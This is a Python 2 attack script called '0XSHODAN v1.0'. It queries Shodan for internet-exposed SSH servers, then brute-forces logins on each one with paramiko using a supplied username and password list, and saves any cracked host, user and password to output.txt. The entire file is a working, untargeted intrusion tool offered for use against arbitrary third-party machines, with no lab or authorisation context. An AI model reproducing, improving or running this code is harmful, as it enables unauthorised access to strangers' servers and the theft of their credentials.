#!usr/bin/env python
#coding: utf-8
# Coded By: Abdullah AlZahrani
# 0XSHODAN v1.0

import os, sys, socket
import paramiko
import shodan # pip install shodan
import time
reload(sys)
sys.setdefaultencoding('utf-8')
global host, username, input_file

banner = '''\033[1;36m
░░░░░░░░▄██████▄  [+] Are you lazy?
░░░░░░░█▀▀▀██▀▀▀▄ [+] Do something()!
░░░░░░░█▄▄▄██▄▄▄█
░░░░░░░▀█████████ [*] 0XSHODAN v1.0
░░░░░░░░▀███▄███▀ [<] Coded by:
░░░░░░░░░▀████▀   [>] Abdullah AlZahrani
░░░░░░░▄████████▄ [T] Twitter: @0xAbdullah
░░░░░░████████████[G] GitHub.com/0xAbdullah
\033[1;m\n'''

if len(sys.argv) == 1:
        print '[!] Usage: python 0xshodan.py -U USERNAME -P passwords.txt'
        sys.exit(1)

API_KEY = "insert your API key" # https://account.shodan.io/register
api = shodan.Shodan(API_KEY)

try:
    results = api.search('ssh')
    for result in results['matches']:
            try:
                os.system("clear")
                print banner
                print '[+] Results found: %s\n[*] Note: You will get the last 100 results only' % results['total']
                host = result['ip_str']
                username = sys.argv[2]
                input_file = sys.argv[4]
                if os.path.exists(sys.argv[4]) == False:
                    print "[!] \033[1;33mFile Path Dose Not exist !\033[1;m"
                    sys.exit()
            except KeyboardInterrupt:
                print "\n\n[+] User requested An Interrupt"
                sys.exit()

            def ssh_connect(Password, code = 0):
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    ssh.connect(host, port=22, username=username, password=password, timeout=2)
                except paramiko.AuthenticationException:
                    code = 1
                except socket.error, e:
                    code = 2
                ssh.close()
                return code
            input_file = open(input_file)
            print " "

            for i in input_file.readlines():
                password = i.strip("\n")
                try:
                    response = ssh_connect(password)

                    if response == 0:
                        print "\n[+] Host: %s User: %s [#] Pass Found: \033[1;32m%s\033[1;m \n" % (host, username, password)
                        Found = "[~] Host: %s\n[@] User: %s\n[$] Password: %s\n\n" % (host, username, password)
                        print "[#] There is a result, Check [\033[1;33moutput.txt\033[1;m] File !"
                        file = open("output.txt", "a")
                        file.write(Found)
                        file.close()
                        time.sleep(5)
                        break
                    elif response == 1:
                        print "[!] Host: %s [#] Pass: \033[1;31m%s\033[1;m --> Login Incorrect !" % (host, password)
                    elif response == 2:
                        print "[*] Host: %s \033[1;33mConnection Could Not Be Established\033[1;m" % (host)
                        break
                except KeyboardInterrupt:
                    print "\n\n[!] The attack was stopped !"
                    sys.exit()
                except Exception, e:
                    print e
                    pass
            input_file.close()
            print ' '
except shodan.APIError, e:
        print 'Error: %s' % e
